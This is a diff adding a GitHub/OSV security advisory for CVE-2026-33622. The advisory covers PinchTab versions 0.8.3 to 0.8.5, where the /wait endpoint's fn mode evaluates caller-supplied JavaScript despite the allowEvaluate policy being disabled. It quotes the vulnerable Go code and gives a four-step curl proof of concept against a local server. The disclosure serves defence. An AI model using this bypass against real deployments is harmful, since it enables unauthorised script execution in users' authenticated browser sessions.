@@ -1,0 +1,70 @@
+{
+  "id": "GHSA-w5pc-m664-r62v",
+  "modified": "2026-03-27T21:32:44.052394Z",
+  "published": "2026-03-24T19:43:30Z",
+  "aliases": [
+    "CVE-2026-33622",
+    "GO-2026-4824"
+  ],
+  "summary": "A PinchTab Security Policy Bypass in /wait Allows Arbitrary JavaScript Execution",
+  "details": "### Summary\nPinchTab `v0.8.3` through `v0.8.5` allow arbitrary JavaScript execution through `POST /wait` and `POST /tabs/{id}/wait` when the request uses `fn` mode, even if `security.allowEvaluate` is disabled.\n\n`POST /evaluate` correctly enforces the `security.allowEvaluate` guard, which is disabled by default. However, in the affected releases, `POST /wait` accepted a user-controlled `fn` expression, embedded it directly into executable JavaScript, and evaluated it in the browser context without checking the same policy.\n\nThis is a security-policy bypass rather than a separate authentication bypass. Exploitation still requires authenticated API access, but a caller with the server token can execute arbitrary JavaScript in a tab context even when the operator explicitly disabled JavaScript evaluation.\n\nThe current worktree fixes this by applying the same policy boundary to `fn` mode in `/wait` that already exists on `/evaluate`, while preserving the non-code wait modes.\n\n### Details\n**Issue 1 — `/evaluate` enforced the guard, `/wait` did not (`v0.8.3` through `v0.8.5`):**\nThe dedicated evaluate endpoint rejected requests when `security.allowEvaluate` was disabled:\n\n```go\n// internal/handlers/evaluate.go — v0.8.5\nfunc (h *Handlers) evaluateEnabled() bool {\n    return h != nil \u0026\u0026 h.Config != nil \u0026\u0026 h.Config.AllowEvaluate\n}\n\nfunc (h *Handlers) HandleEvaluate(w http.ResponseWriter, r *http.Request) {\n    if !h.evaluateEnabled() {\n        httpx.ErrorCode(w, 403, \"evaluate_disabled\", httpx.DisabledEndpointMessage(\"evaluate\", \"security.allowEvaluate\"), false, map[string]any{\n            \"setting\": \"security.allowEvaluate\",\n        })\n        return\n    }\n    // ...\n}\n```\n\nIn the same releases, `/wait` did not apply that guard before evaluating `fn`:\n\n```go\n// internal/handlers/wait.go — v0.8.5 (vulnerable)\nfunc (h *Handlers) handleWaitCore(w http.ResponseWriter, r *http.Request, req waitRequest) {\n    mode := req.mode()\n    if mode == \"\" {\n        httpx.Error(w, 400, fmt.Errorf(\"one of selector, text, url, load, fn, or ms is required\"))\n        return\n    }\n\n    // No evaluateEnabled() check here in affected releases\n    // ...\n}\n```\n\n**Issue 2 — `fn` mode evaluated caller-supplied JavaScript directly:**\nThe `fn` branch built executable JavaScript from the request field and passed it to `chromedp.Evaluate`:\n\n```go\n// internal/handlers/wait.go — v0.8.5 (vulnerable)\ncase \"fn\":\n    js = fmt.Sprintf(`!!(function(){try{return %s}catch(e){return false}})()`, req.Fn)\n    matchLabel = \"fn\"\n\n// Poll loop\nevalErr := chromedp.Run(tCtx, chromedp.Evaluate(js, \u0026result))\n```\n\nBecause `req.Fn` was interpolated directly into evaluated JavaScript, a caller could supply expressions with side effects, not just passive predicates.\n\n**Issue 3 — Current worktree contains an unreleased fix:**\nThe current worktree closes this gap by making `fn` mode in `/wait` respect the same `security.allowEvaluate` policy boundary that `/evaluate` already enforced. The underlying non-code wait modes remain available.\n\n### PoC\n**Prerequisites**\n\n- PinchTab `v0.8.3`, `v0.8.4`, or `v0.8.5`\n- A configured API token\n- `security.allowEvaluate = false`\n- A reachable tab context, created by the caller or already present\n\n**Step 1 — Confirm `/evaluate` is blocked by policy**\n\n```bash\ncurl -s -X POST http://localhost:9867/evaluate \\\n  -H \"Authorization: Bearer \u003cTOKEN\u003e\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"expression\":\"1+1\"}'\n```\n\nExpected:\n\n```json\n{\n  \"code\": \"evaluate_disabled\"\n}\n```\n\n**Step 2 — Open a tab**\n\n```bash\ncurl -s -X POST http://localhost:9867/navigate \\\n  -H \"Authorization: Bearer \u003cTOKEN\u003e\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"url\":\"https://example.com\"}'\n```\n\nExample result:\n\n```json\n{\n  \"tabId\": \"\u003cTAB_ID\u003e\",\n  \"title\": \"Example Domain\",\n  \"url\": \"https://example.com/\"\n}\n```\n\n**Step 3 — Execute JavaScript through `/wait` using `fn` mode**\n\n```bash\ncurl -s -X POST http://localhost:9867/wait \\\n  -H \"Authorization: Bearer \u003cTOKEN\u003e\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"tabId\":\"\u003cTAB_ID\u003e\",\n    \"fn\":\"(function(){window._poc_executed=true;return true})()\",\n    \"timeout\":5000\n  }'\n```\n\nExample result:\n\n```json\n{\n  \"waited\": true,\n  \"elapsed\": 1,\n  \"match\": \"fn\"\n}\n```\n\n**Step 4 — Verify the side effect**\n\n```bash\ncurl -s -X POST http://localhost:9867/wait \\\n  -H \"Authorization: Bearer \u003cTOKEN\u003e\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"tabId\":\"\u003cTAB_ID\u003e\",\n    \"fn\":\"window._poc_executed === true\",\n    \"timeout\":3000\n  }'\n```\n\nExample result:\n\n```json\n{\n  \"waited\": true,\n  \"elapsed\": 0,\n  \"match\": \"fn\"\n}\n```\n\n**Observation**\n1. `/evaluate` returns `evaluate_disabled` when `security.allowEvaluate` is off.\n2. `/wait` still evaluates caller-supplied JavaScript through `fn` mode in the affected releases.\n3. The first `/wait` request introduces a side effect in page state.\n4. The second `/wait` request confirms that the side effect occurred, demonstrating arbitrary JavaScript execution despite the disabled evaluate policy.\n\n### Impact\n1. Bypass of the explicit `security.allowEvaluate` control in `v0.8.3` through `v0.8.5`.\n2. Arbitrary JavaScript execution in the reachable browser tab context for callers who already possess the server API token.\n3. Ability to read or modify page state and act within authenticated browser sessions available to that tab context.\n4. Inconsistent security boundaries between `/evaluate` and `/wait`, making the configured execution policy unreliable.\n5. This is not an unauthenticated issue. Practical risk depends on who can access the API and whether the deployment exposes tabs containing sensitive authenticated state.\n\n### Suggested Remediation\n1. Make `fn` mode in `/wait` enforce the same policy check as `/evaluate`.\n2. Keep non-code wait modes available when JavaScript evaluation is disabled.\n3. Add regression coverage so the policy boundary remains consistent across endpoints.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/pinchtab/pinchtab/cmd/pinchtab",
+        "purl": "pkg:golang/github.com/pinchtab/pinchtab/cmd/pinchtab"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.8.3"
+            },
+            {
+              "last_affected": "0.8.5"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-w5pc-m664-r62v/GHSA-w5pc-m664-r62v.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/pinchtab/pinchtab",
+        "purl": "pkg:golang/github.com/pinchtab/pinchtab"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.8.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-w5pc-m664-r62v/GHSA-w5pc-m664-r62v.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/pinchtab/pinchtab/security/advisories/GHSA-w5pc-m664-r62v"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33622"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/pinchtab/pinchtab"
+    }
+  ]
+}
